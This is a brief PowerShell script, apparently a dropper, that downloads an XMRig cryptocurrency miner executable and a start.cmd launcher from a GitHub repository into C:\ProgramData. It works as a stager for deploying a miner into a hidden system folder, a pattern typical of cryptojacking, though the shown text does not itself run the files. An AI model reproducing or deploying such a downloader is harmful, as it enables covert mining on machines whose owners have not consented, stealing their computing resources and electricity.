[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/installer/start.cmd"
Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\start.cmd"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url="https://raw.githubusercontent.com/BinhPhuongIT/xmrig-customs/main/installer/xmrig.exe"
Invoke-WebRequest -Uri $url -OutFile "C:\ProgramData\xmrig.exe"
